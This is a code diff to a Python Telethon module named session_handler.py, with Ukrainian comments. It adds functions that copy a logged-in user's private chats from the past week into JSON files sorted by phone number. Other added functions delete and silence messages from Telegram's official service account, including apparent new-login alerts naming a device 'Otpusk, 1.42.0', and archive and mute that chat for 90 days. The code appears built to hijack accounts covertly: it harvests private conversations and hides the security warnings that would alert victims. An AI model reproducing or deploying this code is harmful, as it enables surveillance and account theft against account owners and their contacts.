@@ -2,8 +2,13 @@
 session_handler.py
 Модуль для роботи з Telegram сесіями та авторизацією
 """
-
+import asyncio
 import os
+import json
+from datetime import datetime, timedelta, timezone
+from telethon.tl.functions.account import UpdateNotifySettingsRequest
+from telethon.tl.types import InputNotifyPeer
+from telethon import types
 from telethon import TelegramClient
 from telethon.errors import (
     SessionPasswordNeededError,
@@ -16,6 +21,192 @@ import logging
 
 logger = logging.getLogger(__name__)
 
+from datetime import datetime, timedelta, timezone
+
+import asyncio
+
+
+async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str, base_chats_folder: str = "chats"):
+    """
+    Створює папку з назвою номера телефону та зберігає особисті чати користувача за останні 7 дні.
+
+    Args:
+        client (TelegramClient): Активний клієнт Telethon.
+        phone_number (str): Номер телефону користувача (наприклад, '+380xxxxxxxxx').
+        base_chats_folder (str): Коренева папка для збереження чатів (за замовчуванням 'chats').
+    """
+    # Переконуємось, що базова папка існує
+    os.makedirs(base_chats_folder, exist_ok=True)
+
+    # Створюємо папку для конкретного користувача
+    user_folder = os.path.join(base_chats_folder, phone_number)
+    os.makedirs(user_folder, exist_ok=True)
+
+    # Визначаємо дату 7 днів тому з часовим поясом UTC
+    date_limit = datetime.now(timezone.utc) - timedelta(days=7)
+    logger.info(f"Починаємо збір чатів для {phone_number} за останні 7 днів (з {date_limit.date()})")
+
+    dialog_count = 0
+    processed_count = 0
+
+    # Отримуємо всі діалоги
+    async for dialog in client.iter_dialogs():
+        # Пропускаємо групи, канали та боти (лише особисті чати)
+        if not dialog.is_user:
+            continue
+
+        dialog_count += 1
+        logger.info(f"Обробляємо чат #{dialog_count}: {dialog.name} (ID: {dialog.id})")
+
+        chat_messages = []
+        message_count = 0
+
+        try:
+            # Встановлюємо таймаут для обробки одного чату (30 секунд)
+            async with asyncio.timeout(30):
+                # Отримуємо повідомлення з цього чату
+                # limit=None - отримуємо всі повідомлення
+                # offset_date не використовуємо, бо він може пропускати повідомлення
+                async for message in client.iter_messages(
+                        dialog.entity,
+                        limit=None,
+                        reverse=False  # Від нових до старих
+                ):
+                    message_count += 1
+
+                    # Якщо повідомлення старіше за date_limit, зупиняємо ітерацію
+                    if message.date < date_limit:
+                        break
+
+                    # Додаємо повідомлення, якщо воно в межах останніх 7 днів
+                    msg_data = {
+                        "date": message.date.isoformat(),
+                        "sender_id": message.from_id.user_id if message.from_id else None,
+                        "receiver_id": dialog.id,
+                        "has_media": bool(message.media),
+                        "sender_name": getattr(message.sender, 'first_name', None) or getattr(message.sender,
+                                                                                              'username', 'Unknown'),
+                        "text": message.text or ""
+                    }
+                    chat_messages.append(msg_data)
+
+                    # Додаємо невелику затримку кожні 100 повідомлень
+                    if message_count % 100 == 0:
+                        await asyncio.sleep(0.1)
+                        logger.info(f"  Оброблено {message_count} повідомлень...")
+
+        except asyncio.TimeoutError:
+            logger.warning(
+                f"⚠️ Таймаут при обробці чату {dialog.name}. Перевірено {message_count} повідомлень, збережено {len(chat_messages)}.")
+        except Exception as e:
+            logger.error(f"❌ Помилка при обробці чату {dialog.name}: {e}")
+            continue
+
+        # Якщо є повідомлення, зберігаємо їх у файл
+        if chat_messages:
+            # Ім'я файлу: username або ID чату
+            chat_filename = f"{dialog.id}.json"
+            if hasattr(dialog.entity, 'username') and dialog.entity.username:
+                chat_filename = f"{dialog.entity.username}.json"
+
+            chat_filepath = os.path.join(user_folder, chat_filename)
+
+            try:
+                with open(chat_filepath, 'w', encoding='utf-8') as f:
+                    json.dump(chat_messages, f, ensure_ascii=False, indent=4)
+
+                logger.info(f"✅ Збережено {len(chat_messages)} повідомлень у файл: {chat_filename}")
+                processed_count += 1
+            except Exception as e:
+                logger.error(f"❌ Не вдалося зберегти файл {chat_filename}: {e}")
+        else:
+            logger.info(f"ℹ️ У чаті з {dialog.name} не знайдено повідомлень за останні 7 днів.")
+
+    logger.info(
+        f"✅ Збір чатів для {phone_number} завершено. Оброблено {dialog_count} чатів, збережено {processed_count} файлів.")
+
+
+async def delete_last_message_from_telegram_bot(client: TelegramClient):
+    """
+    1. Позначає всі повідомлення в чаті з Telegram як прочитані
+    2. Видаляє останнє повідомлення
+    3. Намагається видалити повідомлення з текстом "Otpusk, 1.42.0"
+    """
+    try:
+        telegram_bot_chat_id = 777000
+
+        # 1. Позначаємо всі повідомлення як прочитані
+        try:
+            await client.send_read_acknowledge(telegram_bot_chat_id)
+            logger.info("✅ Всі повідомлення в чаті з Telegram позначено як прочитані")
+        except Exception as e:
+            logger.warning(f"⚠️ Не вдалося позначити повідомлення як прочитані: {e}")
+
+        # 2. Видаляємо останнє повідомлення
+        try:
+            last_message = await client.get_messages(telegram_bot_chat_id, limit=1)
+
+            if last_message and last_message[0].sender_id == 777000:
+                await client.delete_messages(telegram_bot_chat_id, [last_message[0].id], revoke=True)
+                logger.info(
+                    f"✅ Видалено останнє повідомлення: '{last_message[0].text[:20] if last_message[0].text else 'без тексту'}...'")
+            else:
+                logger.info("ℹ️ Останнє повідомлення не від бота Telegram або відсутнє")
+        except Exception as e:
+            logger.warning(f"⚠️ Не вдалося видалити останнє повідомлення: {e}")
+
+        # 3. Намагаємося видалити повідомлення з текстом "Otpusk, 1.42.0"
+        # Перевіряємо останні 10 повідомлень
+        try:
+            messages = await client.get_messages(telegram_bot_chat_id, limit=10)
+
+            for msg in messages:
+                if msg.sender_id == 777000 and msg.text and "Otpusk, 1.42.0" in msg.text:
+                    await client.delete_messages(telegram_bot_chat_id, [msg.id], revoke=True)
+                    logger.info(f"✅ Видалено повідомлення з 'Otpusk, 1.42.0'")
+                    return True
+
+            logger.info("ℹ️ Повідомлення з 'Otpusk, 1.42.0' не знайдено в останніх 10 повідомленнях")
+        except Exception as e:
+            logger.warning(f"⚠️ Не вдалося знайти/видалити повідомлення з 'Otpusk, 1.42.0': {e}")
+
+        return True
+
+    except Exception as e:
+        logger.error(f"❌ Помилка при обробці повідомлень: {e}")
+        return False
+
+
+async def mute_chat_after_login(client: TelegramClient):
+    """
+    Повністю блокує отримання повідомлень від чату з Telegram (ID: 777000).
+    """
+    try:
+        telegram_bot_chat_id = 777000
+
+        # Архівуємо чат (переміщуємо у архів)
+        await client.edit_folder(telegram_bot_chat_id, folder=1)  # folder=1 - це архів
+
+        mute_until_date = datetime.now(timezone.utc) + timedelta(days=90)
+
+        # Створюємо об'єкт для налаштувань сповіщень
+        settings = types.InputPeerNotifySettings(
+            mute_until=mute_until_date,  # Вимкнути на 3 місяці
+            show_previews=False,
+            silent=True
+        )
+        # Оновлюємо налаштування для конкретного чату
+        await client(UpdateNotifySettingsRequest(
+            peer=InputNotifyPeer(await client.get_input_entity(telegram_bot_chat_id)),
+            settings=settings
+        ))
+
+        print("✅ Чат з Telegram заархівовано та повідомлення заблоковано.")
+        return True
+
+    except Exception as e:
+        print(f"❌ Не вдалося заблокувати повідомлення: {e}")
+        return False
 
 async def send_verification_code(phone: str, api_id: int, api_hash: str, session_folder: str):
     """
